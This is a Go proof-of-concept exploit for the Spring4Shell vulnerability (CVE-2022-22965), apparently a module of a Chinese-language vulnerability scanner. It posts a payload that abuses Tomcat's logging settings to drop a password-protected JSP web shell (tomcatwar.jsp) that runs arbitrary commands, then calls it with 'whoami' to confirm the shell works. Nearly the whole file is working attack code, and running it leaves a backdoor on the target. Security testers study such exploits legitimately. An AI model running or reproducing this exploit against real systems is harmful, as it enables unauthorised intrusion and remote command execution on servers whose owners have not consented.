package poc

import (
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"ssp/common"
	"strings"
)

func CVE_2022_22965(url string) {
	headers := map[string]string{
		"Accept-Encoding": "gzip, deflate",
		"Accept":          "*/*",
		"Accept-Language": "en",
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
		"Connection":      "close",
		"suffix":          "%>//",
		"c1":              "Runtime",
		"c2":              "<%",
		"DNT":             "1",
		"Content-Type":    "application/x-www-form-urlencoded",
	}

	payload := "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

	client := &http.Client{}

	req, err := http.NewRequest("POST", url, strings.NewReader(payload))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}

	req1, err := http.NewRequest("POST", url, strings.NewReader(payload))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp1, err := client.Do(req1)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}

	defer resp.Body.Close()
	defer resp1.Body.Close()

	shellURL := url + "tomcatwar.jsp?pwd=j&cmd=whoami"
	resp2, err := client.Get(shellURL)
	if err != nil {
		fmt.Println("Error getting shell:", err)
		return
	}

	defer resp.Body.Close()

	resp2, err = client.Get(shellURL)
	if err != nil {
		fmt.Println("Error getting shell:", err)
		return
	}

	defer resp2.Body.Close()

	body, err := ioutil.ReadAll(resp2.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	if resp.StatusCode == 200 && strings.Contains(string(body), "getRuntime().exec") {
		common.PrintVulnerabilityConfirmation("CVE_2022_22965", url, shellURL, "5")
		common.Vulnum++
	} else {
		color.Yellow("[-] %s 未发现CVE-2022-22965远程命令执行漏洞\n", url)
	}
}
